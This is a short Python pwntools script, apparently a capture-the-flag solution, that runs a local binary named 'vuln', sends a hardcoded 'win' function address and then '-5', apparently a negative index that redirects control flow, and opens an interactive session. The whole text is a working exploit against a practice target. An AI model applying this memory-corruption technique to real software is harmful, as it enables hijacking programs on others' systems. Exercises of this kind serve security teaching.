from pwn import *
s = process('./vuln')
win = 0x80485c6 
s.sendline(str(int(win)))
s.sendline('-5')
s.interactive()